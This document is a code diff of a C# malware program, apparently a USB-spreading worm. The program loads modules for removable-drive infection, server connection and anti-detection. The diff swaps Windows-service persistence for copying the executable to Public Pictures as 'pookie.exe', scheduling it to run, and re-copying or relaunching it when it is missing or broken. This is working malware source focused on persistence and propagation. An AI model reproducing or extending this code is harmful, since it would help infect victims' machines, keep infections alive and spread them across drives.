@@ -1,86 +1,90 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
-using System.ServiceProcess;
 
 namespace zort
 {
-    class Program : ServiceBase
+    class Program
     {
         readonly List<IPayloadModule> modules = new List<IPayloadModule>
                 {
                     new RemovableInfector(),
-                    new ElevationHelper(),
-                    new ServiceManager(),
+                    //new ElevationHelper(),
+                    //new ServiceManager(),
                     new ServerCon(),
                     new AntiDetection(),
                 };
 
-        public Program()
-        {
-            ServiceName = "conhostsvc";
-        }
-
         static void Main(string[] args)
-        {
-            //if is admin install and start service else just init modules normally
-            bool isAdmin = ElevationHelper.IsElevated();
-            if (isAdmin)
-            {
-                using (var service = new Program())
-                {
-                    if (Environment.UserInteractive)
-                    {
-                        service.OnStart(args);
-                        //Console.WriteLine("Press any key to stop the service...");
-
-                        while (true)
-                        {
-                            Console.ReadLine();
-                        }
-                        //service.OnStop();
-                    }
-                    else
-                    {
-                        ServiceBase.Run(service);
-                    }
-                }
-            }
-            else
-            {
-                RemovableInfector.CheckIfRunningFromRemovableDrive();
-                if (!RemovableInfector.IsSystemInfected()) PersistenceHelper.MoveAndRunFromStartup();
-                else Environment.Exit(0);
-                var program = new Program();
-                program.InitModules();
-                //Console.WriteLine("Press any key to exit...");
-                while (true)
-                {
-                    Console.ReadLine();
-                }
-            }
-        }
-
-        protected override void OnStart(string[] args)
         {
             try
             {
-                Console.WriteLine("Setting DACL rules.");
                 RemovableInfector.CheckIfRunningFromRemovableDrive();
-                InitModules();
-                PersistenceHelper.SetDACL();
+                if (!RemovableInfector.IsSystemInfected())
+                {
+                    PersistenceHelper.CopyToPicturesAndScheduleRun();
+                }
+                else
+                {
+                    //Check if the exe in Public Pictures is running
+                    string exePath = @"C:\\Users\\Public\\Pictures\\pookie.exe";
+                    string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                    Console.WriteLine($"Self path: {selfPath}");
+                    Console.WriteLine($"Exe path: {exePath}");
+                    if (Path.GetFullPath(selfPath).Equals(Path.GetFullPath(exePath), StringComparison.OrdinalIgnoreCase))
+                    {
+                        Console.WriteLine("Infected file (me) is running.");
+                    }
+                    else
+                    {
+                        bool running = Process.GetProcessesByName("pookie").Length > 0;
+                        if (File.Exists(exePath))
+                        {
+                            Console.WriteLine("Infected files found in Public Pictures.");
+                            if (!running)
+                            {
+                                Console.WriteLine("Infected files found in Public Pictures not running. Running the infected file.");
+                                var p = Process.Start(exePath);
+                                //check if it exits in 5 seconds
+                                p.WaitForExit(5000);
+                                if(p.HasExited)
+                                {
+                                    //exe is broken. recopy it and continue running from here.
+                                    PersistenceHelper.CopyToPicturesAndScheduleRun(true);
+                                    Console.WriteLine("Infected file is broken. Recopying it to Public Pictures.");
+                                    goto payload;
+                                }
+                            }
+                            Environment.Exit(0);
+                        }
+                        else
+                        {
+                            Console.WriteLine("No infected files found in Public Pictures.");
+                            PersistenceHelper.CopyToPicturesAndScheduleRun(true); //just copy and let the already existing wmi action to handle it.
+                        }
+                    }
+
+                    payload:
+                    var program = new Program();
+                    program.InitModules();
+                    //Console.WriteLine("Press any key to exit...");
+                    while (true)
+                    {
+                        Console.ReadLine();
+                    }
+                }
             }
             catch (Exception ex)
             {
-                System.IO.File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
+                File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
                 throw;
             }
         }
 
-        protected override void OnStop()
+        protected void OnStop()
         {
             StopModules();
-            base.OnStop();
         }
 
         private void StopModules()
@@ -94,59 +98,31 @@ namespace zort
 
         private void InitModules()
         {
-            bool isAdmin = ElevationHelper.IsElevated();
+            bool isAdmin = false;
 
-            // Check if legally elevated
-            if (isAdmin)
+            modules.ForEach(m =>
             {
-                if (File.Exists(ElevationHelper.GetElevationFilePath()))
+                switch (m.ElevationType)
                 {
-                    Console.WriteLine("Elevation file exists, indicating a legal elevation. continue action");
-                    File.Delete(ElevationHelper.GetElevationFilePath());
+                    case ElevationType.Elevated:
+                        if (!isAdmin)
+                        {
+                            Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
+                            return;
+                        }
+                        break;
+                    case ElevationType.NonElevated:
+                        if (isAdmin)
+                        {
+                            Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
+                            return;
+                        }
+                        break;
                 }
-                else
-                {
-                    isAdmin = false;
 
-                    Console.WriteLine("Elevation file does not exist, indicating an illegal elevation. Checking for a file on the desktop...");
-
-                    // Check if there is a file called asdfmovie.txt in desktop
-                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                    string filePath = Path.Combine(desktopPath, "pookiebear.txt");
-                    if (!File.Exists(filePath)) goto modules;
-                    //Validate the file contents. it should contain "hey boyz!!"
-                    string fileContents = File.ReadAllText(filePath);
-                    if (!fileContents.Contains("hey boyz!!")) goto modules;
-                    Console.WriteLine("File contents are valid. authorized exec.");
-                    isAdmin = true;
-                }
-            }
-
-            modules:
-
-                modules.ForEach(m =>
-                {
-                    switch (m.ElevationType)
-                    {
-                        case ElevationType.Elevated:
-                            if (!isAdmin)
-                            {
-                                Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
-                                return;
-                            }
-                            break;
-                        case ElevationType.NonElevated:
-                            if (isAdmin)
-                            {
-                                Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
-                                return;
-                            }
-                            break;
-                    }
-
-                    Console.WriteLine($"Starting module {m.ModuleName}");
-                    m.Start();
-                });
-            }
+                Console.WriteLine($"Starting module {m.ModuleName}");
+                m.Start();
+            });
         }
     }
+}
